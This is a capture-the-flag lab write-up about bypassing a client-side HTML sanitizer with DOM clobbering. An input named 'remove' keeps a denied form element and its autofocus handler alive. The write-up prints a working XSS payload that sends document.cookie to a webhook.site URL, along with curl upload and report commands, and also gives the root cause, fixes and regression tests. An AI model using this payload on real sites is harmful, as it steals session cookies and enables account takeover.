# COLLIDE Pwnbox Lab - DOM Clobbering Sanitizer Bypass

Date: 2026-07-08
Target type: CTF/lab
Bug class: XSS, DOM clobbering, client-side sanitizer bypass, reviewer-bot cookie theft

## Observation

Target: `https://d3f592890f21.pwnbox-lab.com/`

Initial facts:

- Login required with provided credentials `demo / demo`.
- Users can upload `.html` or `.svg` snippets.
- Preview page loads raw snippet text from `/raw/<id>` and renders it client-side.
- Reviewer bot visits reported preview URLs.
- Challenge hint says the sanitizer walks the rendered tree and drops dangerous elements and attributes.

Confirmed frontend flow:

1. `POST /api/login` sets session cookies.
2. `POST /api/snippet` stores the uploaded snippet.
3. `GET /p/<id>` fetches `/raw/<id>` with `credentials: 'omit'`.
4. Preview page runs `window.setHTML(target, rawText)` from `/sanitizer.js`.
5. `POST /api/report` queues the reviewer visit.

## Hypothesis

If the sanitizer removes dangerous nodes by calling instance methods on attacker-controlled elements, DOM clobbering may let a denied element survive with its dangerous attributes intact.

The most promising target is a denied `<form>` element because forms expose named children as properties. An embedded child such as `<input id="remove">` may shadow `form.remove`, causing `el.remove()` to fail during sanitizer cleanup.

If the sanitizer queues the form for removal before stripping `on*` attributes, the event handler should survive and execute after insertion into the preview DOM.

## Evidence

Live `sanitizer.js` behavior:

```javascript
if (HARD_DENY.has(tag)) { drop.push(n); continue; }
...
if (an.indexOf('on') === 0) n.removeAttribute(a.name);
...
drop.forEach(function (el) { try { el.remove(); } catch (_) {} });
```

Important confirmed properties:

1. `form` is in `HARD_DENY`.
2. Denied tags hit `continue` before event-handler stripping.
3. Cleanup uses `el.remove()` directly.
4. Cleanup failure is silently ignored.

Local Chrome reproduction against the live sanitizer confirmed:

- Plain `<form onfocus=... autofocus>` is removed.
- `<form onfocus=... autofocus><input id="remove"></form>` survives.
- The surviving form keeps its `onfocus` attribute.

Observed sanitized HTML for the working local test:

```html
<form onfocus="window.__hit='focus'" autofocus="" tabindex="1"></form>
```

## Test

Minimal payload:

```html
<form onfocus="fetch('https://webhook.site/d6bb003f-7359-4aea-9f93-833163050bf5?c='+document.cookie)" autofocus tabindex="1"><input id="remove"></form>
```

Upload and report flow:

```bash
curl -sS -X POST "https://d3f592890f21.pwnbox-lab.com/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"demo","password":"demo"}'

curl -sS -X POST "https://d3f592890f21.pwnbox-lab.com/api/snippet" \
  -F "snippet=@pwn.html;type=text/html"

curl -sS -X POST "https://d3f592890f21.pwnbox-lab.com/api/report" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://d3f592890f21.pwnbox-lab.com/p/2ed2e84a6b3ebbf2534d7d31"}'
```

## Failed Assumptions

1. **Simple event-handler XSS would work** - `img onerror`, `svg onload`, and similar direct payloads were stripped.
2. **`javascript:` URL trick alone was enough** - control-character URL variants survived some normalization checks but did not execute in practice.
3. **SVG-only payloads were the easiest route** - CSS resource loading from SVG/HTML was confirmed, but not script execution.
4. **Parser-breakout / mutation-XSS would be required** - unnecessary once the removal logic flaw was confirmed.
5. **Need a complex multi-stage reviewer exploit** - a single autofocus handler on a surviving denied form was enough.

## Result

Confirmed chain:

```text
User-controlled HTML upload
-> preview page fetches raw snippet text
-> client-side sanitizer parses into a template
-> denied <form> is queued for removal before attribute scrubbing
-> child <input id="remove"> clobbers form.remove
-> cleanup silently fails
-> form survives with onfocus handler intact
-> targetEl.replaceChildren() mounts the form
-> autofocus triggers onfocus in reviewer context
-> document.cookie exfiltrated to webhook
```

Webhook evidence:

```text
c=flag=pwnbox{05c9d2a86f4b8e731ad06ce3b8f24107}
```

Flag:

```text
pwnbox{05c9d2a86f4b8e731ad06ce3b8f24107}
```

## Why Failed Payloads Failed

| Attempt | Why it failed |
|---|---|
| `<img src=x onerror=...>` | Sanitizer stripped the `onerror` attribute |
| `<svg onload=...>` | Sanitizer stripped the `onload` attribute |
| `javascript:` URL tricks | Survived sanitization in some cases but did not produce execution in this flow |
| External SVG `<use>` tests | Resource loading did not translate into script execution |
| Popup / cross-subdomain carrier ideas | Unnecessary and did not yield a reliable same-origin execution path |

## Why Working Test Worked

The winning payload breaks one sanitizer assumption at a time:

1. The sanitizer assumes denied nodes can be safely deferred into a drop list.
2. It assumes `el.remove()` is trustworthy on attacker-created elements.
3. It strips event handlers only on nodes that are not already denied.

For a form element, `id="remove"` on a named child shadows the instance `remove` member. Cleanup fails, but the form was never attribute-scrubbed because the code hit `continue` early. The mounted form then executes through the built-in `autofocus` -> `focus` path without any user interaction.

## Root Cause

1. Dangerous attributes were not scrubbed on denied elements before drop.
2. Removal relied on attacker-clobberable instance methods.
3. Removal errors were swallowed, so sanitizer failure became allow-by-default.

## Impact

- Reviewer-bot JavaScript execution in same-origin preview context.
- Theft of readable cookies from the reviewer session.
- In a real application, potential account takeover, CSRF-on-behalf-of-reviewer, or access to internal preview data.

## Fix

- Strip `on*` and dangerous URL attributes before deciding whether the element will be dropped.
- Use realm-safe prototype calls such as `Element.prototype.remove.call(el)`.
- Fail closed if sanitizer cleanup throws on a denied node.
- Add explicit tests for DOM clobbering against forms and other named-property host elements.

## Regression Test

- `<form onfocus=alert(1) autofocus><input id="remove"></form>` must not leave any form or `onfocus` attribute in the rendered output.
- `<form onclick=alert(1)><input id="remove"></form>` must not survive with `onclick`.
- Any sanitizer cleanup failure on a denied node should leave no executable attributes in the mounted DOM.

## Conclusion

Confirmed DOM clobbering XSS in the client-side sanitizer. The bypass does not rely on obscure browser parsing alone; it is rooted in sanitizer control flow and clobberable DOM instance methods.

## Next Step

Create a clean final writeup focused on the minimal exploit chain and defensive lesson.
